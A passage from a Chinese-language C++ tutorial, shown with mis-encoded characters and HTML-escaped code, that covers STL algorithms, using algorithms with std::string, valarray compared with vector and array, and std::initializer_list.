&#125;); if (it_even != nums.end()) &#123; std::cout &lt;&lt; &quot;First even number: &quot; &lt;&lt; *it_even &lt;&lt; std::endl; // è¾“å‡º 4 &#125; // 2. sort: æŒ‰ç»å¯¹å€¼å¤§å°æ’åº (è‡ªå®šä¹‰æ¯”è¾ƒ) std::vector&lt;int&gt; mixed = &#123;3, -1, 4, -1, 5, -9, 2, -6&#125;; std::sort(mixed.begin(), mixed.end(), [](int a, int b)&#123; return std::abs(a) &lt; std::abs(b); &#125;); std::cout &lt;&lt; &quot;Sorted by absolute value: &quot;; for(int x : mixed) std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; // è¾“å‡º: -1 -1 2 3 4 5 -6 -9 (æˆ–ç±»ä¼¼ï¼Œå–å†³äºç¨³å®šæ’åº) std::cout &lt;&lt; std::endl; // 3. transform: å°†æ‰€æœ‰å…ƒç´ å¹³æ–¹ std::vector&lt;int&gt; squares(nums.size()); // ç›®æ ‡å®¹å™¨éœ€è¦è¶³å¤Ÿå¤§ std::transform(nums.begin(), nums.end(), squares.begin(), [](int x)&#123; return x * x; &#125;); std::cout &lt;&lt; &quot;Squares: &quot;; for(int x : squares) std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; // è¾“å‡º: 9 1 16 1 25 81 4 36 std::cout &lt;&lt; std::endl; // 4. accumulate: è®¡ç®—æ‰€æœ‰å…ƒç´ çš„å’Œ int sum = std::accumulate(nums.begin(), nums.end(), 0); // 0 æ˜¯åˆå§‹å€¼ std::cout &lt;&lt; &quot;Sum: &quot; &lt;&lt; sum &lt;&lt; std::endl; // è¾“å‡º 31 // 5. for_each: å¯¹æ¯ä¸ªå…ƒç´ æ‰§è¡Œæ“ä½œ std::vector&lt;Person&gt; people = &#123;&#123;&quot;Alice&quot;, 30&#125;, &#123;&quot;Bob&quot;, 25&#125;, &#123;&quot;Charlie&quot;, 35&#125;&#125;; std::cout &lt;&lt; &quot;People: &quot;; std::for_each(people.begin(), people.end(), [](const Person&amp; p)&#123; std::cout &lt;&lt; p.name &lt;&lt; &quot;(&quot; &lt;&lt; p.age &lt;&lt; &quot;) &quot;; &#125;); std::cout &lt;&lt; std::endl; // è¾“å‡º: Alice(30) Bob(25) Charlie(35) return 0;&#125; 16.6.3 STL å’Œ string ç±»std::string ç±»è™½ç„¶ä¸æ˜¯ STL å®¹å™¨ï¼ˆå®ƒæ²¡æœ‰ value_type ç­‰åµŒå¥—ç±»å‹å®šä¹‰ï¼‰ï¼Œä½†å®ƒæä¾›äº†ä¸ STL å…¼å®¹çš„æ¥å£ï¼Œç‰¹åˆ«æ˜¯è¿­ä»£å™¨ (begin(), end() ç­‰ï¼‰ã€‚å› æ­¤ï¼Œè®¸å¤š STL ç®—æ³•å¯ä»¥ç›´æ¥åº”ç”¨äº std::string å¯¹è±¡ã€‚ 1234567891011121314151617181920212223242526272829303132#include &lt;string&gt;#include &lt;algorithm&gt;#include &lt;iostream&gt;#include &lt;cctype&gt; // for ::tolowerint main() &#123; std::string str = &quot;Hello World&quot;; // ä½¿ç”¨ find æŸ¥æ‰¾å­—ç¬¦ auto it_l = std::find(str.begin(), str.end(), &#x27;l&#x27;); if (it_l != str.end()) &#123; // è®¡ç®—ç´¢å¼• size_t index = std::distance(str.begin(), it_l); std::cout &lt;&lt; &quot;&#x27;l&#x27; first found at index: &quot; &lt;&lt; index &lt;&lt; std::endl; // è¾“å‡º 2 &#125; // ä½¿ç”¨ count_if ç»Ÿè®¡å°å†™å­—æ¯æ•°é‡ int lower_count = std::count_if(str.begin(), str.end(), [](char c)&#123; return std::islower(c); &#125;); std::cout &lt;&lt; &quot;Lowercase count: &quot; &lt;&lt; lower_count &lt;&lt; std::endl; // è¾“å‡º 9 // ä½¿ç”¨ transform å°†å­—ç¬¦ä¸²è½¬ä¸ºå°å†™ std::transform(str.begin(), str.end(), str.begin(), // å¯ä»¥åŸåœ°ä¿®æ”¹ [](unsigned char c)&#123; return std::tolower(c); &#125;); // ä½¿ç”¨ unsigned char é¿å…è´Ÿå€¼é—®é¢˜ std::cout &lt;&lt; &quot;Lowercase string: &quot; &lt;&lt; str &lt;&lt; std::endl; // è¾“å‡º: hello world // ä½¿ç”¨ reverse åè½¬å­—ç¬¦ä¸² std::reverse(str.begin(), str.end()); std::cout &lt;&lt; &quot;Reversed string: &quot; &lt;&lt; str &lt;&lt; std::endl; // è¾“å‡º: dlrow olleh return 0;&#125; è™½ç„¶ string ç±»æœ¬èº«ä¹Ÿæä¾›äº†è®¸å¤šæˆå‘˜å‡½æ•°ï¼ˆå¦‚ find, replaceï¼‰ï¼Œä½†ä½¿ç”¨ STL ç®—æ³•æœ‰æ—¶å¯ä»¥æä¾›æ›´é€šç”¨æˆ–æ›´å¼ºå¤§çš„åŠŸèƒ½ï¼ˆä¾‹å¦‚é…åˆ lambda ä½¿ç”¨å¤æ‚æ¡ä»¶ï¼‰ã€‚ 16.6.4 å‡½æ•°å’Œå®¹å™¨æ–¹æ³•æœ‰æ—¶ï¼Œå®¹å™¨æœ¬èº«æä¾›äº†ä¸æŸä¸ª STL ç®—æ³•åŠŸèƒ½ç›¸ä¼¼çš„æˆå‘˜å‡½æ•°ã€‚ä¾‹å¦‚ï¼š list æœ‰è‡ªå·±çš„ sort() æˆå‘˜å‡½æ•°ã€‚ list æœ‰è‡ªå·±çš„ remove() å’Œ remove_if() æˆå‘˜å‡½æ•°ã€‚ list æœ‰è‡ªå·±çš„ unique() æˆå‘˜å‡½æ•°ã€‚ set, map ç­‰å…³è”å®¹å™¨æœ‰ find() æˆå‘˜å‡½æ•°ã€‚ ä½•æ—¶ä½¿ç”¨æˆå‘˜å‡½æ•° vs. STL ç®—æ³•ï¼Ÿ ä¼˜å…ˆä½¿ç”¨æˆå‘˜å‡½æ•° (å¦‚æœå¯ç”¨ä¸”æ»¡è¶³éœ€æ±‚): å®¹å™¨çš„æˆå‘˜å‡½æ•°é€šå¸¸èƒ½æ›´å¥½åœ°åˆ©ç”¨å®¹å™¨çš„å†…éƒ¨ç»“æ„è¿›è¡Œä¼˜åŒ–ã€‚ ä¾‹å¦‚ï¼Œlist::sort() æ¯” std::sort(list.begin(), list.end()) (å¦‚æœ list è¿­ä»£å™¨æ”¯æŒçš„è¯ï¼Œä½†å®ƒä¸æ”¯æŒéšæœºè®¿é—®ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨ std::sort) æ›´é«˜æ•ˆï¼Œå› ä¸ºå®ƒåªéœ€è¦é‡æ–°é“¾æ¥èŠ‚ç‚¹ï¼Œè€Œä¸éœ€è¦ç§»åŠ¨å…ƒç´ ã€‚ list::remove() å¯ä»¥çœŸæ­£åœ°ä»é“¾è¡¨ä¸­åˆ é™¤èŠ‚ç‚¹å¹¶è°ƒæ•´å¤§å°ï¼Œè€Œ std::remove ä¸èƒ½ã€‚ å…³è”å®¹å™¨çš„ find() æˆå‘˜å‡½æ•°åˆ©ç”¨å…¶å†…éƒ¨æ ‘æˆ–å“ˆå¸Œç»“æ„ï¼Œå¤æ‚åº¦ä¸º O(log N) æˆ– O(1)ï¼Œè€Œ std::find æ˜¯çº¿æ€§æ‰«æ O(N)ã€‚ ä½¿ç”¨ STL ç®—æ³•: å½“å®¹å™¨æ²¡æœ‰æä¾›ç›¸åº”çš„æˆå‘˜å‡½æ•°æ—¶ã€‚ å½“éœ€è¦è·¨ä¸åŒå®¹å™¨ç±»å‹ä½¿ç”¨ç»Ÿä¸€çš„ç®—æ³•æ—¶ã€‚ å½“éœ€è¦æ›´å¤æ‚çš„ã€æˆå‘˜å‡½æ•°ä¸æ”¯æŒçš„æ“ä½œé€»è¾‘æ—¶ï¼ˆä¾‹å¦‚ï¼Œä½¿ç”¨ std::remove_copy_if å°†ä¸æ»¡è¶³æ¡ä»¶çš„å…ƒç´ å¤åˆ¶åˆ°å¦ä¸€ä¸ªå®¹å™¨ï¼‰ã€‚ 16.6.5 ä½¿ç”¨ STLæŒæ¡ STL çš„å…³é”®åœ¨äºç†è§£å…¶ä¸‰ä¸ªæ ¸å¿ƒç»„ä»¶å¦‚ä½•ååŒå·¥ä½œï¼š é€‰æ‹©åˆé€‚çš„å®¹å™¨: æ ¹æ®æ•°æ®å­˜å‚¨å’Œè®¿é—®çš„éœ€æ±‚é€‰æ‹© vector, list, map, set ç­‰ã€‚ ä½¿ç”¨è¿­ä»£å™¨æŒ‡å®šèŒƒå›´: é€šè¿‡ begin(), end() æˆ–å…¶ä»–æ–¹å¼è·å–è¿­ä»£å™¨æ¥å®šä¹‰ç®—æ³•æ“ä½œçš„å…ƒç´ åŒºé—´ [first, last)ã€‚ é€‰æ‹©åˆé€‚çš„ç®—æ³•: ä» &lt;algorithm&gt; æˆ– &lt;numeric&gt; ä¸­é€‰æ‹©èƒ½å®Œæˆæ‰€éœ€ä»»åŠ¡çš„ç®—æ³•ã€‚ æä¾›è‡ªå®šä¹‰é€»è¾‘ (å¦‚æœéœ€è¦): é€šè¿‡å‡½æ•°å¯¹è±¡ã€lambda è¡¨è¾¾å¼æˆ–å‡½æ•°æŒ‡é’ˆå‘ç®—æ³•ä¼ é€’è‡ªå®šä¹‰çš„æ¯”è¾ƒã€åˆ¤æ–­æˆ–æ“ä½œè§„åˆ™ã€‚ STL æ˜¯ä¸€ä¸ªå¼ºå¤§è€Œçµæ´»çš„åº“ï¼Œç†Ÿç»ƒä½¿ç”¨å®ƒå¯ä»¥å¤§å¤§æé«˜ C++ ç¼–ç¨‹çš„æ•ˆç‡å’Œä»£ç è´¨é‡ã€‚å»ºè®®å¤šæŸ¥é˜…æ–‡æ¡£ï¼ˆå¦‚ cppreference.comï¼‰äº†è§£å„ç§å®¹å™¨ã€ç®—æ³•å’Œè¿­ä»£å™¨çš„è¯¦ç»†ç”¨æ³•å’Œè¦æ±‚ã€‚ 16.7 å…¶ä»–åº“é™¤äº† string ç±»ã€æ™ºèƒ½æŒ‡é’ˆå’Œ STL çš„æ ¸å¿ƒç»„ä»¶ï¼ˆå®¹å™¨ã€ç®—æ³•ã€è¿­ä»£å™¨ï¼‰ä¹‹å¤–ï¼ŒC++ æ ‡å‡†åº“è¿˜æä¾›äº†è®¸å¤šå…¶ä»–æœ‰ç”¨çš„å·¥å…·å’Œç±»ã€‚æœ¬èŠ‚å°†ç®€è¦ä»‹ç» valarray ç±»å’Œ C++11 å¼•å…¥çš„ initializer_listã€‚ 16.7.1 vectorã€valarray å’Œ arrayæˆ‘ä»¬åœ¨å‰é¢ç« èŠ‚å·²ç»æ¥è§¦è¿‡ vector å’Œ arrayï¼Œå®ƒä»¬éƒ½æä¾›äº†ç±»ä¼¼æ•°ç»„çš„åŠŸèƒ½ï¼Œä½†å„æœ‰ç‰¹ç‚¹ã€‚æ ‡å‡†åº“è¿˜åœ¨ &lt;valarray&gt; å¤´æ–‡ä»¶ä¸­æä¾›äº†å¦ä¸€ä¸ªæ¨¡æ¿ç±» std::valarrayï¼Œå®ƒä¸»è¦è®¾è®¡ç”¨äºæ•°å€¼è®¡ç®—ï¼Œç‰¹åˆ«æ˜¯å¯¹æ•´ä¸ªæ•°ç»„è¿›è¡Œé«˜æ•ˆçš„å…ƒç´ çº§ç®—æœ¯è¿ç®—ã€‚ std::vector&lt;T&gt;: å¤´æ–‡ä»¶: &lt;vector&gt; å¤§å°: åŠ¨æ€å¤§å°ï¼Œå¯è¿è¡Œæ—¶å¢é•¿å’Œæ”¶ç¼©ã€‚ å†…å­˜: ä¿è¯å…ƒç´ è¿ç»­å­˜å‚¨ã€‚ ä¸»è¦ç‰¹ç‚¹: é€šç”¨çš„åŠ¨æ€æ•°ç»„ï¼Œæ”¯æŒä¸°å¯Œçš„ STL ç®—æ³•ï¼Œå°¾éƒ¨æ’å…¥/åˆ é™¤é«˜æ•ˆã€‚ æ•°å€¼è¿ç®—: ä¸ç›´æ¥æ”¯æŒå…ƒç´ çº§çš„ç®—æœ¯è¿ç®—ç¬¦ï¼ˆä¾‹å¦‚ï¼Œä¸¤ä¸ª vector ä¸èƒ½ç›´æ¥ç›¸åŠ ï¼‰ã€‚éœ€è¦æ‰‹åŠ¨å¾ªç¯æˆ–ä½¿ç”¨ std::transform ç­‰ç®—æ³•ã€‚ std::array&lt;T, N&gt; (C++11): å¤´æ–‡ä»¶: &lt;array&gt; å¤§å°: å›ºå®šå¤§å° Nï¼Œåœ¨ç¼–è¯‘æ—¶ç¡®å®šã€‚ å†…å­˜: ä¿è¯å…ƒç´ è¿ç»­å­˜å‚¨ï¼Œé€šå¸¸åœ¨æ ˆä¸Šåˆ†é…ï¼ˆå¦‚æœæ˜¯å±€éƒ¨å˜é‡ä¸”å¤§å°é€‚ä¸­ï¼‰ã€‚ ä¸»è¦ç‰¹ç‚¹: å¯¹ C é£æ ¼æ•°ç»„çš„ç±»å‹å®‰å…¨å°è£…ï¼Œæ”¯æŒ STL ç®—æ³•ï¼Œæ€§èƒ½ä¸ C é£æ ¼æ•°ç»„ç›¸å½“ã€‚ æ•°å€¼è¿ç®—: ä¸ vector ç±»ä¼¼ï¼Œä¸ç›´æ¥æ”¯æŒå…ƒç´ çº§è¿ç®—ã€‚ std::valarray&lt;T&gt;: å¤´æ–‡ä»¶: &lt;valarray&gt; å¤§å°: åŠ¨æ€å¤§å°ï¼ˆä½†é€šå¸¸åœ¨åˆ›å»ºåå¤§å°å˜åŒ–ä¸é¢‘ç¹ï¼‰ã€‚ å†…å­˜: ä¸ä¿è¯è¿ç»­å­˜å‚¨ï¼ˆå®ç°å¯èƒ½è¿›è¡Œä¼˜åŒ–ï¼Œå¦‚åˆ†å—ï¼‰ã€‚ ä¸»è¦ç‰¹ç‚¹: ä¸“ä¸ºæ•°å€¼è®¡ç®—è®¾è®¡ã€‚é‡è½½äº†ç®—æœ¯è¿ç®—ç¬¦ (+, -, *, / ç­‰ï¼‰ä»¥æ”¯æŒå…ƒç´ çº§ (element-wise) æ“ä½œã€‚è¿˜æä¾›äº†è®¸å¤šæ•°å­¦å‡½æ•°ï¼ˆå¦‚ abs, sqrt, sin, cos ç­‰ï¼‰çš„åº”ç”¨ç‰ˆæœ¬ã€‚ STL å…¼å®¹æ€§: ä¸æ ‡å‡† STL ç®—æ³•çš„å…¼å®¹æ€§ä¸å¦‚ vector å’Œ array å¥½ï¼ˆä¾‹å¦‚ï¼Œå…¶è¿­ä»£å™¨å¯èƒ½ä¸æ˜¯æ ‡å‡†ç±»åˆ«ï¼‰ã€‚ æ¯”è¾ƒæ€»ç»“: ç‰¹æ€§ std::vector&lt;T&gt; std::array&lt;T, N&gt; (C++11) std::valarray&lt;T&gt; å¤´æ–‡ä»¶ &lt;vector&gt; &lt;array&gt; &lt;valarray&gt; å¤§å° åŠ¨æ€ å›ºå®š (ç¼–è¯‘æ—¶) åŠ¨æ€ å†…å­˜ è¿ç»­ è¿ç»­ ä¸ä¿è¯è¿ç»­ ä¸»è¦ç”¨é€” é€šç”¨åŠ¨æ€æ•°ç»„ C æ•°ç»„çš„å®‰å…¨æ›¿ä»£å“ æ•°å€¼è®¡ç®— å…ƒç´ çº§è¿ç®— å¦ å¦ æ˜¯ STL ç®—æ³• å®Œå…¨å…¼å®¹ å®Œå…¨å…¼å®¹ æœ‰é™å…¼å®¹ valarray ç¤ºä¾‹: 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;valarray&gt;#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;numeric&gt; // for iotaint main() &#123; // ä½¿ç”¨ valarray è¿›è¡Œå…ƒç´ çº§è¿ç®— std::valarray&lt;double&gt; v1 = &#123;1.0, 2.0, 3.0, 4.0&#125;; std::valarray&lt;double&gt; v2 = &#123;0.5, 0.5, 0.5, 0.5&#125;; std::valarray&lt;double&gt; v_sum, v_prod; v_sum = v1 + v2; // å…ƒç´ çº§ç›¸åŠ : &#123;1.5, 2.5, 3.5, 4.5&#125; v_prod = v1 * 2.0; // æ¯ä¸ªå…ƒç´ ä¹˜ä»¥ 2.0: &#123;2.0, 4.0, 6.0, 8.0&#125; std::cout &lt;&lt; &quot;v1 + v2 = &quot;; for (double x : v_sum) std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; // C++11 range-based for å¯èƒ½ä¸ç›´æ¥æ”¯æŒ valarray // ä½¿ç”¨ä¼ ç»Ÿå¾ªç¯æˆ–ä¸‹æ ‡è®¿é—® // for (size_t i = 0; i &lt; v_sum.size(); ++i) std::cout &lt;&lt; v_sum[i] &lt;&lt; &quot; &quot;; std::cout &lt;&lt; std::endl; std::cout &lt;&lt; &quot;v1 * 2.0 = &quot;; for (size_t i = 0; i &lt; v_prod.size(); ++i) std::cout &lt;&lt; v_prod[i] &lt;&lt; &quot; &quot;; std::cout &lt;&lt; std::endl; // åº”ç”¨æ•°å­¦å‡½æ•° std::valarray&lt;double&gt; v_sqrt = std::sqrt(v_prod); // å¯¹æ¯ä¸ªå…ƒç´ æ±‚å¹³æ–¹æ ¹ std::cout &lt;&lt; &quot;sqrt(v_prod) = &quot;; for (size_t i = 0; i &lt; v_sqrt.size(); ++i) std::cout &lt;&lt; v_sqrt[i] &lt;&lt; &quot; &quot;; std::cout &lt;&lt; std::endl; // å¯¹æ¯” vector (éœ€è¦ç®—æ³•) std::vector&lt;double&gt; vec1 = &#123;1.0, 2.0, 3.0, 4.0&#125;; std::vector&lt;double&gt; vec_prod(vec1.size()); std::transform(vec1.begin(), vec1.end(), vec_prod.begin(), [](double x)&#123; return x * 2.0; &#125;); // vec_prod ç°åœ¨æ˜¯ &#123;2.0, 4.0, 6.0, 8.0&#125; return 0;&#125; å¦‚æœä½ çš„ä¸»è¦ä»»åŠ¡æ˜¯è¿›è¡Œå‘é‡åŒ–æˆ–çŸ©é˜µå¼çš„æ•°å€¼è®¡ç®—ï¼Œvalarray å¯èƒ½æ˜¯ä¸€ä¸ªå€¼å¾—è€ƒè™‘çš„é€‰æ‹©ï¼Œå°½ç®¡åœ¨ç°ä»£ C++ ä¸­ï¼Œä¹Ÿæœ‰è®¸å¤šç¬¬ä¸‰æ–¹åº“ï¼ˆå¦‚ Eigen, Blazeï¼‰æä¾›äº†æ›´å¼ºå¤§å’Œçµæ´»çš„çº¿æ€§ä»£æ•°åŠŸèƒ½ã€‚å¯¹äºé€šç”¨çš„åŠ¨æ€åºåˆ—å­˜å‚¨ï¼Œvector ä»ç„¶æ˜¯é¦–é€‰ã€‚ 16.7.2 æ¨¡æ¿ initializer_listï¼ˆC++11ï¼‰C++11 å¼•å…¥äº†ä¸€ä¸ªæ–°çš„æ¨¡æ¿ç±» std::initializer_list&lt;T&gt;ï¼Œå®šä¹‰åœ¨ &lt;initializer_list&gt; å¤´æ–‡ä»¶ä¸­ã€‚å®ƒæ˜¯ä¸€ä¸ªè½»é‡çº§çš„ä»£ç†å¯¹è±¡ï¼Œä»£è¡¨äº†ä¸€ä¸ªç”¨èŠ±æ‹¬å· &#123;&#125; åˆå§‹åŒ–çš„å€¼åˆ—è¡¨ï¼Œå…¶ä¸­æ‰€æœ‰å€¼çš„ç±»å‹éƒ½æ˜¯ T æˆ–å¯ä»¥éšå¼è½¬æ¢ä¸º Tã€‚ ä¸»è¦ç›®çš„: ä½¿å¾—å‡½æ•°ï¼ˆå°¤å…¶æ˜¯æ„é€ å‡½æ•°ï¼‰èƒ½å¤Ÿæ¥å—ä»»æ„æ•°é‡çš„ã€ç±»å‹ç›¸åŒçš„åˆå§‹åŒ–å€¼ï¼Œå°±åƒå†…ç½®æ•°ç»„æˆ–èšåˆç±»å‹é‚£æ ·ä½¿ç”¨èŠ±æ‹¬å·åˆå§‹åŒ–ä¸€æ ·ã€‚ ç‰¹ç‚¹: è½»é‡çº§: initializer_list å¯¹è±¡æœ¬èº«é€šå¸¸åªåŒ…å«æŒ‡å‘åº•å±‚ï¼ˆä¸´æ—¶ï¼‰æ•°ç»„çš„æŒ‡é’ˆå’Œæ•°ç»„çš„å¤§å°ã€‚å¤åˆ¶ initializer_list å¯¹è±¡æ˜¯æµ…æ‹·è´ï¼Œå¼€é”€å¾ˆå°ã€‚ åªè¯»è®¿é—®: é€šè¿‡ initializer_list è®¿é—®å…¶å…ƒç´ é€šå¸¸æ˜¯åªè¯»çš„ (const T&amp;)ã€‚ä½ ä¸èƒ½é€šè¿‡ initializer_list ä¿®æ”¹åˆ—è¡¨ä¸­çš„å…ƒç´ ã€‚ ç”Ÿå‘½å‘¨æœŸ: initializer_list å¼•ç”¨çš„åº•å±‚æ•°ç»„çš„ç”Ÿå‘½å‘¨æœŸä¸ initializer_list å¯¹è±¡æœ¬èº«ç›¸å…³è”ï¼Œé€šå¸¸æ˜¯ä¸´æ—¶çš„ã€‚ä¸è¦å­˜å‚¨ initializer_list å¯¹è±¡å¹¶åœ¨å…¶åŸå§‹ä¸Šä¸‹æ–‡ä¹‹å¤–ä½¿ç”¨ã€‚ è¿­ä»£å™¨: æä¾›äº† begin() å’Œ end() æˆå‘˜å‡½æ•°ï¼Œè¿”å›æŒ‡å‘åº•å±‚æ•°ç»„çš„ const T* æŒ‡é’ˆï¼Œå¯ä»¥æ–¹ä¾¿åœ°éå†åˆ—è¡¨ä¸­çš„å…ƒç´ ã€‚ size(): è¿”å›åˆ—è¡¨ä¸­çš„å…ƒç´ æ•°é‡ã€‚ å¦‚ä½•å·¥ä½œ: å½“ç¼–è¯‘å™¨é‡åˆ°ä¸€ä¸ªéœ€è¦ std::initializer_list&lt;T&gt; å‚æ•°çš„åœ°æ–¹ï¼Œå¹¶ä¸”ä½ æä¾›äº†ä¸€ä¸ª &#123;value1, value2, ...&#125; å½¢å¼çš„åˆå§‹åŒ–åˆ—è¡¨æ—¶ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨ï¼š åˆ›å»ºä¸€ä¸ªä¸´æ—¶çš„ã€ç±»å‹ä¸º const T çš„æ•°ç»„ï¼Œå¹¶å°†åˆ—è¡¨ä¸­çš„å€¼å­˜å‚¨è¿›å»ã€‚ åˆ›å»ºä¸€ä¸ª std::initializer_list&lt;T&gt; å¯¹è±¡ï¼Œä½¿å…¶å†…éƒ¨æŒ‡é’ˆæŒ‡å‘è¿™ä¸ªä¸´æ—¶æ•°ç»„çš„å¼€å¤´ï¼Œå¹¶è®°å½•æ•°ç»„çš„å¤§å°ã€‚ å°†è¿™ä¸ª initializer_list&lt;T&gt; å¯¹è±¡ä¼ é€’ç»™å‡½æ•°æˆ–æ„é€ å‡½æ•°ã€‚ 16.7.3 ä½¿ç”¨ initializer_listinitializer_list æœ€å¸¸è§çš„ç”¨é€”æ˜¯ä½œä¸ºå‡½æ•°æˆ–æ„é€ å‡½æ•°çš„å‚æ•°ç±»å‹ã€‚ 1. ä½œä¸ºå‡½æ•°å‚æ•°: 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;initializer_list&gt;#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;string&gt;// å‡½æ•°æ¥å—ä¸€ä¸ª initializer_list&lt;int&gt;void print_ints(std::initializer_list&lt;int&gt; il) &#123; std::cout &lt;&lt; &quot;Printing &quot; &lt;&lt; il.size() &lt;&lt; &quot; integers: &quot;; // å¯ä»¥ä½¿ç”¨èŒƒå›´ for å¾ªç¯éå† for (const int&amp; val : il) &#123; std::cout &lt;&lt; val &lt;&lt; &quot; &quot;; &#125; // æˆ–è€…ä½¿ç”¨ begin()/end() // for (auto it = il.begin(); it != il.end(); ++it) &#123; // std::cout &lt;&lt; *it &lt;&lt; &quot; &quot;; // &#125; std::cout &lt;&lt; std::endl;&#125;// æ¨¡æ¿å‡½æ•°æ¥å—ä»»æ„ç±»å‹çš„ initializer_listtemplate &lt;typename T&gt;T sum_list(std::initializer_list&lt;T&gt; il) &#123; T total&#123;&#125;; // å€¼åˆå§‹åŒ– (å¯¹äºæ•°å€¼ç±»å‹ä¸º 0) for (const T&amp; val : il) &#123; total += val; &#125; return total;&#125;int main() &#123; print_ints(&#123;1, 2, 3&#125;); // ç›´æ¥ä¼ é€’èŠ±æ‹¬å·åˆ—è¡¨ print_ints(&#123;10, 20, 30, 40, 50&#125;); print_ints(&#123;&#125;); // ä¼ é€’ç©ºåˆ—è¡¨ int total_int = sum_list(&#123;1, 1, 2, 3, 5, 8&#125;); std::cout &lt;&lt; &quot;Sum of ints: &quot; &lt;&lt; total_int &lt;&lt; std::endl; // è¾“å‡º 20 double total_double = sum_list(&#123;1.1, 2.2, 3.3&#125;); std::cout &lt;&lt; &quot;Sum of doubles: &quot; &lt;&lt; total_double &lt;&lt; std::endl; // è¾“å‡º 6.6 // std::string total_string = sum_list&lt;std::string&gt;(&#123;&quot;Hello&quot;, &quot; &quot;, &quot;World&quot;&#125;); // ä¹Ÿå¯ä»¥ç”¨äºæ”¯æŒ += çš„ç±»å‹ // std::cout &lt;&lt; &quot;Sum of strings: &quot; &lt;&lt; total_string &lt;&lt; std::endl; // è¾“å‡º &quot;Hello World&quot; return 0;&#125; 2. ä½œä¸ºæ„é€ å‡½æ•°å‚æ•°: è¿™æ˜¯ initializer_list æœ€é‡è¦çš„ç”¨é€”ä¹‹ä¸€ï¼Œå®ƒä½¿å¾— STL å®¹å™¨ï¼ˆå¦‚ vector, list, map, set ç­‰ï¼‰ä»¥åŠç”¨æˆ·è‡ªå®šä¹‰çš„ç±»èƒ½å¤Ÿæ”¯æŒç®€æ´çš„èŠ±æ‹¬å·åˆ—è¡¨åˆå§‹åŒ–ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;vector&gt;#include &lt;map&gt;#include &lt;string&gt;#include &lt;initializer_list&gt;#include &lt;iostream&gt;// ç¤ºä¾‹ï¼šä¸€ä¸ªç®€å•çš„è‡ªå®šä¹‰ç±»ï¼Œæ”¯æŒ initializer_list æ„é€ class MyData &#123;private: std::vector&lt;int&gt; data_;public: // æ„é€ å‡½æ•°æ¥å— initializer_list MyData(std::initializer_list&lt;int&gt; il) : data_(il) &#123; // å¯ä»¥ç›´æ¥ç”¨æ¥åˆå§‹åŒ– vector æˆå‘˜ std::cout &lt;&lt; &quot;MyData constructed with &quot; &lt;&lt; il.size() &lt;&lt; &quot; elements.\\n&quot;; &#125; void print() const &#123; for (int x : data_) &#123; std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; std::endl; &#125;&#125;;int main() &#123; // ä½¿ç”¨ initializer_list æ„é€  STL å®¹å™¨ std::vector&lt;int&gt; v = &#123;10, 20, 30&#125;; // è°ƒç”¨ vector(initializer_list&lt;int&gt;) æ„é€ å‡½æ•° std::map&lt;std::string, int&gt; m = &#123;&#123;&quot;one&quot;, 1&#125;, &#123;&quot;two&quot;, 2&#125;, &#123;&quot;three&quot;, 3&#125;&#125;; // è°ƒç”¨ map(initializer_list&lt;pair&lt;const string, int&gt;&gt;) // ä½¿ç”¨ initializer_list æ„é€ è‡ªå®šä¹‰ç±» MyData md1 = &#123;1, 3, 5, 7, 9&#125;; MyData md2 &#123;2, 4, 6&#125;; // ä¹Ÿå¯ä»¥ç”¨èŠ±æ‹¬å·ç›´æ¥åˆå§‹åŒ– std::cout &lt;&lt; &quot;md1 data: &quot;; md1.print(); std::cout &lt;&lt; &quot;md2 data: &quot;; md2.print(); return 0;&#125; initializer_list æå¤§åœ°å¢å¼ºäº† C++11 åŠä»¥åç‰ˆæœ¬çš„åˆå§‹åŒ–è¯­æ³•ï¼Œä½¿å…¶æ›´åŠ ç»Ÿä¸€å’Œæ–¹ä¾¿ï¼Œç‰¹åˆ«æ˜¯å¯¹äºå®¹å™¨å’Œéœ€è¦æ¥å—å¯å˜æ•°é‡åŒç±»å‹å‚æ•°çš„åœºæ™¯ã€‚ 16.8 æ€»ç»“æœ¬ç« æ·±å…¥æ¢è®¨äº† C++ æ ‡å‡†åº“æä¾›çš„å‡ ä¸ªå¼ºå¤§çš„å·¥å…·ï¼Œå®ƒä»¬æå¤§åœ°å¢å¼ºäº† C++ çš„åŠŸèƒ½å’Œæ˜“ç”¨æ€§ï¼Œç‰¹åˆ«æ˜¯ string ç±»ã€æ™ºèƒ½æŒ‡é’ˆå’Œæ ‡å‡†æ¨¡æ¿åº“ (STL)ã€‚ ä¸»è¦å†…å®¹å›é¡¾ï¼š string ç±»: æä¾›äº†æ¯” C é£æ ¼å­—ç¬¦æ•°ç»„æ›´å®‰å…¨ã€æ›´æ–¹ä¾¿çš„å­—ç¬¦ä¸²å¤„ç†æ–¹å¼ï¼Œå…·æœ‰è‡ªåŠ¨å†…å­˜ç®¡ç†å’Œä¸°å¯Œçš„æˆå‘˜å‡½æ•°ï¼ˆæ„é€ ã€è¾“å…¥ã€æ‹¼æ¥ã€æŸ¥æ‰¾ã€ä¿®æ”¹ã€æ¯”è¾ƒç­‰ï¼‰ã€‚ æ”¯æŒé€šè¿‡ c_str() è·å–ä¸ C é£æ ¼å‡½æ•°å…¼å®¹çš„ const char*ã€‚ æ ‡å‡†åº“è¿˜æä¾›äº†å®½å­—ç¬¦ç‰ˆæœ¬å¦‚ wstringã€‚ æ™ºèƒ½æŒ‡é’ˆ (&lt;memory&gt;): ç”¨äºè‡ªåŠ¨ç®¡ç†åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼Œé˜²æ­¢å†…å­˜æ³„æ¼å’Œæ‚¬æŒ‚æŒ‡é’ˆã€‚ unique_ptr: å®ç°ç‹¬å æ‰€æœ‰æƒï¼Œè½»é‡çº§ï¼Œä¸å¯å¤åˆ¶ï¼Œå¯ç§»åŠ¨ã€‚ç®¡ç†åŠ¨æ€æ•°ç»„æ—¶ä½¿ç”¨ unique_ptr&lt;T[]&gt;ã€‚æ˜¯ç®¡ç†åŠ¨æ€èµ„æºçš„é¦–é€‰ã€‚ shared_ptr: 